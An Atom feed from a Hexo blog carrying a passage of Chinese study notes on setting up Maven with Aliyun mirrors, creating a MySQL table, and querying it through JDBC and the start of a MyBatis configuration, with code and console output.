<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="https://juana-2u.github.io/atom.xml" rel="self"/>
  
  <link href="https://juana-2u.github.io/"/>
  <updated>2024-04-23T05:25:27.930Z</updated>
  <id>https://juana-2u.github.io/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SSM</title>
    <link href="https://juana-2u.github.io/2024/04/23/SSM/"/>
    <id>https://juana-2u.github.io/2024/04/23/SSM/</id>
    <published>2024-04-23T05:24:18.000Z</published>
    <updated>2024-04-23T05:25:27.930Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="高级架构应用"><a href="#高级架构应用" class="headerlink" title="高级架构应用"></a>高级架构应用</h1><h1 id="DAY1-24-3-7"><a href="#DAY1-24-3-7" class="headerlink" title="DAY1-24.3.7"></a>DAY1-24.3.7</h1><h2 id="maven的回顾"><a href="#maven的回顾" class="headerlink" title="maven的回顾"></a>maven的回顾</h2><p>将电脑中maven删除，本地仓库全部删除，注意.m下的默认仓库设置，再将系统环境中关于maven的全部删除，</p><p>下载maven的安装包，直接解压，conf下的settings.xml换个国内的阿里源</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;mirror&gt;</span><br><span class="line">&lt;<span class="built_in">id</span>&gt;aliyunmaven&lt;/<span class="built_in">id</span>&gt;</span><br><span class="line">&lt;mirrorOf&gt;*&lt;/mirrorOf&gt;</span><br><span class="line">&lt;name&gt;阿里云公共仓库&lt;/name&gt;</span><br><span class="line">&lt;url&gt;[https://maven.aliyun.com/repository/public](https://maven.aliyun.com/repository/public)&lt;/url&gt;</span><br><span class="line">&lt;/mirror&gt;</span><br></pre></td></tr></table></figure></div><p><strong>设置环境变量</strong></p><p>变量名：MAVEN_HOME</p><p>变量值：D:\Environment\maven-3.8.1\apache-maven-3.8.1</p><p><strong>配置Path，双击打开Path—&gt;新建   输入：</strong>%MAVEN_HOME%\bin<br>以管理员身份打开shell 输入：mvn -v 查看maven的版本信息，证明配置成功。</p><p><strong>配置maven环境</strong></p><p><strong>创建一个名为myRepository的文件夹。修改settings.xml配置文件，位置在\conf目录下。</strong></p><p><strong>使用记事本打开settings.xml，将文件中的所有信息替换为如下，并保存后退出</strong></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;settings xmlns=<span class="string">&quot;http://maven.apache.org/SETTINGS/1.0.0&quot;</span></span><br><span class="line">          xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">          xsi:schemaLocation=<span class="string">&quot;http://maven.apache.org/SETTINGS/1.0.0 http://maven.apache.org/xsd/settings-1.0.0.xsd&quot;</span>&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;!-- &lt;localRepository&gt;/Users/Fred/Downloads/apache-maven-<span class="number">3.5</span><span class="number">.4</span>/repository&lt;/localRepository&gt; --&gt;</span><br><span class="line">  &lt;localRepository&gt;D:/Environment/maven-<span class="number">3.8</span><span class="number">.1</span>/myRepository&lt;/localRepository&gt;</span><br><span class="line"></span><br><span class="line">  &lt;pluginGroups&gt;   </span><br><span class="line">  &lt;/pluginGroups&gt;</span><br><span class="line"></span><br><span class="line">  &lt;proxies&gt;   </span><br><span class="line">  &lt;/proxies&gt;</span><br><span class="line"></span><br><span class="line">  &lt;servers&gt;   </span><br><span class="line">  &lt;/servers&gt;</span><br><span class="line"></span><br><span class="line">  &lt;mirrors&gt;</span><br><span class="line">  &lt;mirror&gt;</span><br><span class="line">        &lt;<span class="built_in">id</span>&gt;alimaven&lt;/<span class="built_in">id</span>&gt;</span><br><span class="line">        &lt;name&gt;aliyun maven&lt;/name&gt;</span><br><span class="line">        &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt;</span><br><span class="line">        &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;</span><br><span class="line">    &lt;/mirror&gt;</span><br><span class="line">    &lt;mirror&gt;</span><br><span class="line">      &lt;<span class="built_in">id</span>&gt;aliyun&lt;/<span class="built_in">id</span>&gt;</span><br><span class="line">      &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;</span><br><span class="line">      &lt;name&gt;aliyun-public&lt;/name&gt;</span><br><span class="line">      &lt;url&gt;https://maven.aliyun.com/repository/public/&lt;/url&gt;</span><br><span class="line">    &lt;/mirror&gt;</span><br><span class="line">    &lt;mirror&gt;</span><br><span class="line">      &lt;<span class="built_in">id</span>&gt;aliyun-spring&lt;/<span class="built_in">id</span>&gt;</span><br><span class="line">      &lt;mirrorOf&gt;spring&lt;/mirrorOf&gt;</span><br><span class="line">      &lt;name&gt;aliyun-spring&lt;/name&gt;</span><br><span class="line">      &lt;url&gt;https://maven.aliyun.com/repository/spring&lt;/url&gt;</span><br><span class="line">    &lt;/mirror&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 中央仓库在中国的镜像 --&gt;</span><br><span class="line">    &lt;mirror&gt;</span><br><span class="line">      &lt;<span class="built_in">id</span>&gt;maven.net.cn&lt;/<span class="built_in">id</span>&gt;</span><br><span class="line">      &lt;name&gt;one of the central mirrors <span class="keyword">in</span> china&lt;/name&gt;</span><br><span class="line">      &lt;url&gt;http://maven.net.cn/content/groups/public/&lt;/url&gt;</span><br><span class="line">      &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;</span><br><span class="line">    &lt;/mirror&gt;</span><br><span class="line">    &lt;!-- 中央仓库<span class="number">1</span> --&gt;</span><br><span class="line">    &lt;mirror&gt;</span><br><span class="line">        &lt;<span class="built_in">id</span>&gt;repo1&lt;/<span class="built_in">id</span>&gt;</span><br><span class="line">        &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;</span><br><span class="line">        &lt;name&gt;Human Readable Name <span class="keyword">for</span> this Mirror.&lt;/name&gt;</span><br><span class="line">        &lt;url&gt;https://repo1.maven.org/maven2/&lt;/url&gt;</span><br><span class="line">    &lt;/mirror&gt;</span><br><span class="line">    </span><br><span class="line">  &lt;/mirrors&gt;</span><br><span class="line"></span><br><span class="line">  &lt;profiles&gt;</span><br><span class="line">    &lt;profile&gt;  </span><br><span class="line">         &lt;<span class="built_in">id</span>&gt;jdk-<span class="number">1.8</span>&lt;/<span class="built_in">id</span>&gt;  </span><br><span class="line">         &lt;activation&gt;  </span><br><span class="line">             &lt;activeByDefault&gt;true&lt;/activeByDefault&gt;  </span><br><span class="line">             &lt;jdk&gt;<span class="number">1.8</span>&lt;/jdk&gt;  </span><br><span class="line">          &lt;/activation&gt;  </span><br><span class="line">          &lt;properties&gt;  </span><br><span class="line">              &lt;maven.compiler.source&gt;<span class="number">1.8</span>&lt;/maven.compiler.source&gt;  </span><br><span class="line">              &lt;maven.compiler.target&gt;<span class="number">1.8</span>&lt;/maven.compiler.target&gt;  </span><br><span class="line">              &lt;maven.compiler.compilerVersion&gt;<span class="number">1.8</span>&lt;/maven.compiler.compilerVersion&gt;  </span><br><span class="line">          &lt;/properties&gt;  </span><br><span class="line">    &lt;/profile&gt;</span><br><span class="line">  &lt;/profiles&gt;</span><br><span class="line">  &lt;activeProfiles&gt;</span><br><span class="line">    &lt;activeProfile&gt;jdk-<span class="number">1.8</span>&lt;/activeProfile&gt;</span><br><span class="line">  &lt;/activeProfiles&gt;</span><br><span class="line">&lt;/settings&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p><strong>打开cmd，执行：mvn help:system</strong></p><p>此时本地仓库就会从中央仓库下载需要的文件。直到出现build success</p><h2 id="IDAE操作数据库"><a href="#IDAE操作数据库" class="headerlink" title="IDAE操作数据库"></a>IDAE操作数据库</h2><p>新建一个数据源，选择mysql的数据源，配置好相关信息后，出现console的文件，设计相关代码</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> database mybatis;</span><br><span class="line"></span><br><span class="line">use mybatis;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">user</span>(</span><br><span class="line">  id <span class="type">int</span>(<span class="number">10</span>) <span class="keyword">primary</span> key auto_increment comment <span class="string">&#x27;用户ID&#x27;</span>,</span><br><span class="line">  name <span class="type">varchar</span>(<span class="number">40</span>) <span class="keyword">not</span> <span class="keyword">null</span>  comment <span class="string">&#x27;用户名&#x27;</span>,</span><br><span class="line">  pwd <span class="type">varchar</span>(<span class="number">40</span>) <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;密码&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">user</span> (name, pwd)</span><br><span class="line"><span class="keyword">values</span> (<span class="string">&#x27;张三1号&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>),</span><br><span class="line">       (<span class="string">&#x27;张三2号&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>),</span><br><span class="line">       (<span class="string">&#x27;张三3号&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>),</span><br><span class="line">       (<span class="string">&#x27;张三4号&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>),</span><br><span class="line">       (<span class="string">&#x27;张三5号&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>),</span><br><span class="line">       (<span class="string">&#x27;张三6号&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>),</span><br><span class="line">       (<span class="string">&#x27;张三7号&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line">       </span><br><span class="line"><span class="keyword">insert</span>  <span class="keyword">into</span> <span class="keyword">user</span>(id, name, pwd) <span class="keyword">values</span>(?,?,?)</span><br></pre></td></tr></table></figure></div><blockquote><p>一个快捷键的回顾：alt实现多选。</p></blockquote><h2 id="JDBC操作数据库实例"><a href="#JDBC操作数据库实例" class="headerlink" title="JDBC操作数据库实例"></a>JDBC操作数据库实例</h2><p>接下来写主函数操作数据库的代码情况</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.neuedu;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDBCTest01</span> &#123;</span><br><span class="line">    <span class="comment">//ClassNotFoundException, SQLException可以使用最大级的Exception来替换</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//配置信息</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/mybatis&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="comment">//1.加载驱动</span></span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>); <span class="comment">//上面的抛出异常</span></span><br><span class="line">        <span class="comment">//2.连接数据库  alt+enter 导包(实例化) 抛出异常</span></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(url, username, password);</span><br><span class="line">        <span class="comment">//3.向数据库发送一个statement对象  进行CRUD</span></span><br><span class="line">        <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement();</span><br><span class="line">        <span class="comment">//4.编写sql（根据不同业务编写）</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from user&quot;</span>;<span class="comment">// 查询所有用户</span></span><br><span class="line">        <span class="comment">//5.执行查询sql，返回一个结果集resultSet</span></span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery(sql);</span><br><span class="line">        <span class="comment">//6.遍历结果集</span></span><br><span class="line">        <span class="keyword">while</span> (resultSet.next())&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;编号=&quot;</span>+resultSet.getInt(<span class="string">&quot;id&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;用户名=&quot;</span>+resultSet.getString(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;密码=&quot;</span>+resultSet.getString(<span class="string">&quot;pwd&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//7.关闭连接，释放资源(先开后关)</span></span><br><span class="line">        resultSet.close();<span class="comment">//先关结果集</span></span><br><span class="line">        statement.close();<span class="comment">//再关statement对象</span></span><br><span class="line">        connection.close();<span class="comment">//最后关connection</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><blockquote><p>快捷的输入方式psvm，即<code>public static void main(String[] args) &#123;&#125;</code></p><p>快捷的输入方式sout，即<code>System.*out*.println();</code></p></blockquote><ul><li><p>选择驱动都可以</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/./SSM.assets/Untitled.png"                      alt="Untitled"                ></p></li></ul><p>输出的结果 出现红色报错 存在的是驱动的引用问题。替换成<code>&#39;com.mysql.cj.jdbc.Driver&#39;</code> 就解决了</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;C:\Program Files\Java\jdk1.8.0_221\bin\java.exe&quot;</span> <span class="string">&quot;-javaagent:C:\Program Files\JetBrains\IntelliJ IDEA 2023.2.3\lib\idea_rt.jar=41969:C:\Program Files\JetBrains\IntelliJ IDEA 2023.2.3\bin&quot;</span> -Dfile.encoding=GBK -classpath <span class="string">&quot;C:\Program Files\Java\jdk1.8.0_221\jre\lib\charsets.jar;C:\Program Files\Java\jdk1.8.0_221\jre\lib\deploy.jar;C:\Program Files\Java\jdk1.8.0_221\jre\lib\ext\access-bridge-64.jar;C:\Program Files\Java\jdk1.8.0_221\jre\lib\ext\cldrdata.jar;C:\Program Files\Java\jdk1.8.0_221\jre\lib\ext\dnsns.jar;C:\Program Files\Java\jdk1.8.0_221\jre\lib\ext\jaccess.jar;C:\Program Files\Java\jdk1.8.0_221\jre\lib\ext\jfxrt.jar;C:\Program Files\Java\jdk1.8.0_221\jre\lib\ext\localedata.jar;C:\Program Files\Java\jdk1.8.0_221\jre\lib\ext\nashorn.jar;C:\Program Files\Java\jdk1.8.0_221\jre\lib\ext\sunec.jar;C:\Program Files\Java\jdk1.8.0_221\jre\lib\ext\sunjce_provider.jar;C:\Program Files\Java\jdk1.8.0_221\jre\lib\ext\sunmscapi.jar;C:\Program Files\Java\jdk1.8.0_221\jre\lib\ext\sunpkcs11.jar;C:\Program Files\Java\jdk1.8.0_221\jre\lib\ext\zipfs.jar;C:\Program Files\Java\jdk1.8.0_221\jre\lib\javaws.jar;C:\Program Files\Java\jdk1.8.0_221\jre\lib\jce.jar;C:\Program Files\Java\jdk1.8.0_221\jre\lib\jfr.jar;C:\Program Files\Java\jdk1.8.0_221\jre\lib\jfxswt.jar;C:\Program Files\Java\jdk1.8.0_221\jre\lib\jsse.jar;C:\Program Files\Java\jdk1.8.0_221\jre\lib\management-agent.jar;C:\Program Files\Java\jdk1.8.0_221\jre\lib\plugin.jar;C:\Program Files\Java\jdk1.8.0_221\jre\lib\resources.jar;C:\Program Files\Java\jdk1.8.0_221\jre\lib\rt.jar;D:\GoodGoodStudy\21pro_practice\new1\Mybatis_Study\mybatis-jdbc-01\target\classes;C:\Users\Administrator\.m2\repository\mysql\mysql-connector-java\8.0.27\mysql-connector-java-8.0.27.jar;C:\Users\Administrator\.m2\repository\com\google\protobuf\protobuf-java\3.11.4\protobuf-java-3.11.4.jar&quot;</span> com.neuedu.JDBCTest01</span><br><span class="line">Loading class `com.mysql.jdbc.Driver<span class="string">&#x27;. This is deprecated. The new driver class is &#x27;</span>com.mysql.cj.jdbc.Driver<span class="string">&#x27;. The driver is automatically registered via the SPI and manual loading of the driver class is generally unnecessary.</span></span><br><span class="line"><span class="string">编号=1</span></span><br><span class="line"><span class="string">用户名=张三1号</span></span><br><span class="line"><span class="string">密码=123456</span></span><br><span class="line"><span class="string">编号=2</span></span><br><span class="line"><span class="string">用户名=张三2号</span></span><br><span class="line"><span class="string">密码=123456</span></span><br><span class="line"><span class="string">编号=3</span></span><br><span class="line"><span class="string">用户名=张三3号</span></span><br><span class="line"><span class="string">密码=123456</span></span><br><span class="line"><span class="string">编号=4</span></span><br><span class="line"><span class="string">用户名=张三4号</span></span><br><span class="line"><span class="string">密码=123456</span></span><br><span class="line"><span class="string">编号=5</span></span><br><span class="line"><span class="string">用户名=张三5号</span></span><br><span class="line"><span class="string">密码=123456</span></span><br><span class="line"><span class="string">编号=6</span></span><br><span class="line"><span class="string">用户名=张三6号</span></span><br><span class="line"><span class="string">密码=123456</span></span><br><span class="line"><span class="string">编号=7</span></span><br><span class="line"><span class="string">用户名=张三7号</span></span><br><span class="line"><span class="string">密码=123456</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">进程已结束，退出代码为 0</span></span><br></pre></td></tr></table></figure></div><p>预编译，sql中使用？代替</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.neuedu;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDBCTest02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line"><span class="comment">//配置信息</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/mybatis&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="comment">//1.加载驱动</span></span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>); <span class="comment">//上面的抛出异常</span></span><br><span class="line">        <span class="comment">//2.连接数据库  alt+enter 导包(实例化) 抛出异常</span></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(url, username, password);</span><br><span class="line">        <span class="comment">//3.编写SQL语句</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span><span class="string">&quot;insert  into user(id, name, pwd) values(?,?,?)&quot;</span>;</span><br><span class="line">        <span class="comment">//4.预编译 实例化</span></span><br><span class="line">        <span class="type">PreparedStatement</span> <span class="variable">preparedStatement</span> <span class="operator">=</span> connection.prepareStatement(sql);</span><br><span class="line">        preparedStatement.setInt(<span class="number">1</span>,<span class="number">8</span>); <span class="comment">//parameterIndex传入参数的下标是1，第一个占位符？值为8 即id=8</span></span><br><span class="line">        preparedStatement.setString(<span class="number">2</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        preparedStatement.setString(<span class="number">3</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line">        <span class="comment">//5.执行预编译</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> preparedStatement.executeUpdate();<span class="comment">//count是受影响的行数</span></span><br><span class="line">        <span class="keyword">if</span>(count&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;插入成功success!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//6.关闭资源</span></span><br><span class="line">        preparedStatement.close();</span><br><span class="line">        connection.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h1 id="Day2-24-3-12"><a href="#Day2-24-3-12" class="headerlink" title="Day2-24.3.12"></a>Day2-24.3.12</h1><h2 id="mybatis官网学习核心配置文件"><a href="#mybatis官网学习核心配置文件" class="headerlink" title="mybatis官网学习核心配置文件"></a>mybatis官网学习核心配置文件</h2><p>先创建一个MyBatis-config.xml的配置文件，但其中需要修改数据库driver、url、username、password的信息。</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="line">&lt;!DOCTYPE configuration</span><br><span class="line">        PUBLIC <span class="string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span><br><span class="line">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">    &lt;environments default=<span class="string">&quot;development&quot;</span>&gt;</span><br><span class="line">        &lt;environment <span class="built_in">id</span>=<span class="string">&quot;development&quot;</span>&gt;</span><br><span class="line">            &lt;transactionManager <span class="built_in">type</span>=<span class="string">&quot;JDBC&quot;</span>/&gt;</span><br><span class="line">            &lt;dataSource <span class="built_in">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span><br><span class="line">                &lt;<span class="built_in">property</span> name=<span class="string">&quot;driver&quot;</span> value=<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>/&gt;</span><br><span class="line">                &lt;<span class="built_in">property</span> name=<span class="string">&quot;url&quot;</span> value=<span class="string">&quot;jdbc:mysql://localhost:3306/mybatis?serverTimezone=GMT%2B8&quot;</span>/&gt;</span><br><span class="line">                &lt;<span class="built_in">property</span> name=<span class="string">&quot;username&quot;</span> value=<span class="string">&quot;root&quot;</span>/&gt;</span><br><span class="line">                &lt;<span class="built_in">property</span> name=<span class="string">&quot;password&quot;</span> value=<span class="string">&quot;123456&quot;</span>/&gt;</span><br><span class="line">            &lt;/dataSource&gt;</span><br><span class="line">        &lt;/environment&gt;</span><br><span class="line">    &lt;/environments&gt;</span><br><span class="line">    &lt;mappers&gt;</span><br><span class="line">        &lt;mapper resource=<span class="string">&quot;org/mybatis/example/BlogMapper.xml&quot;</span>/&gt;</span><br><span class="line">    &lt;/mappers&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure></div><p>在此之前需要创建一个用作实体类的文件。</p><p>创建pojo软件包存放实体类文件：</p><ul><li>实体的属性私有</li><li>get()与set()方法的定义</li><li>toString()方法的定义</li><li>有参构造与无参构造函数的定义（有参构造alt+insert全选，无参构造则全部选 ctrl）</li></ul><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 